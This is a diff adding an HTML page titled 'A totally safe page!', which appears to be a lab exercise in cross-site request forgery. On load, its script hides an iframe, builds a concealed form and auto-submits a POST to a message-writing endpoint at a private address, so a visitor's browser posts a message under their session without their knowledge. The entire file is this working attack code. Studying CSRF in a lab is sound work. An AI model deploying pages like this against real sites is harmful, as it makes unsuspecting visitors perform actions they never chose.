@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+	 <meta charset="UTF-8"> 
+	<title>A totally safe page!</title>
+	<style> iframe {display: none} </style>
+</head>
+<body>
+	<img src="http://images2.wikia.nocookie.net/__cb20120806014646/thesatancrew/images/e/e4/Skull_trumpet.gif" />
+
+	<script>
+		  var iframe = document.createElement("iframe");
+		  document.body.appendChild(iframe);
+		  iframe.contentWindow.name = 'post_iframe';
+
+		  var form = document.createElement("form");
+		  form.target = 'post_iframe';
+		  form.action = "http://10.0.23.22/myspray/writemessage92.html";
+		  form.method = "POST";
+
+		  var subject = document.createElement("input");
+		  subject.type = "hidden";
+		  subject.name = "subject";
+		  subject.value = "Hello";
+		  form.appendChild(subject);
+
+		  var message = document.createElement("input");
+		  message.type = "hidden";
+		  message.name = "message";
+		  message.value = "I just accessed a cool web page!";
+		  form.appendChild(message);
+
+		  document.body.appendChild(form);
+		  form.submit();
+	</script>
+</body>
+</html>
